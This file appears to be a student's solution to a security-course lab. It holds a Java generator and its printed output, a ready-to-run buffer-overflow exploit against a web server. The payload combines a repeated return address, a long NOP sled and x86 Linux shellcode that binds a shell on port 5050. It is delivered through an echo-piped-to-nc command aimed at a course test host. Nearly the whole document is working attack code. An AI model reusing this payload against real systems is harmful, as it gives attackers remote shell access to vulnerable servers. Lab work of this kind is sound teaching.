

//DO NOT COMPILE THIS FILE
//Shellcode used is down below
Shellcode:

Java file to print the string:

public class HelloWorld{

     public static void main(String []args){
        System.out.print("echo -e \"GET/" );

        // print the return address
        for(int i =0; i < 50; i++){
            System.out.print("\\x84\\xfd\\xff\\xbf");
        }
        // I have used port 5050 for hacking: 5050 is hex 0x13ba. Replaced it in the port in the suggested shellcode.c 
        // the \13\d2 in the line pushw	$0xd213(line) replaced with port 5050 hex value
        String str1 = "\\x31\\xc0\\x50\\x40\\x89\\xc3\\x50\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x31\\xd2\\x52\\x66\\x68\\x13\\xba\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x40\\x89\\x44\\x24\\x04\\x43\\x43\\xb0\\x66\\xcd\\x80\\x83\\xc4\\x0c\\x52\\x52\\x43\\xb0\\x66\\xcd\\x80\\x93\\x89\\xd1\\xb0\\x3f\\xcd\\x80\\x41\\x80\\xf9\\x03\\x75\\xf6\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";
     
    //Add Nops 
    for(int j = 0; j <500; j++){
        System.out.print("\\x90");
    }
    System.out.print(str1);
    System.out.print("HTTP\" | nc 310test.cs.duke.edu 9218");
     }
}


// Generated Shell code:

echo -e "GET /\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x84\xfd\xff\xbf\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x31\xd2\x52\x66\x68\x13\xba\x43\x66\x53\x89\xe1\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd\x80\x40\x89\x44\x24\x04\x43\x43\xb0\x66\xcd\x80\x83\xc4\x0c\x52\x52\x43\xb0\x66\xcd\x80\x93\x89\xd1\xb0\x3f\xcd\x80\x41\x80\xf9\x03\x75\xf6\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80HTTP" | nc 310test.cs.duke.edu 9218

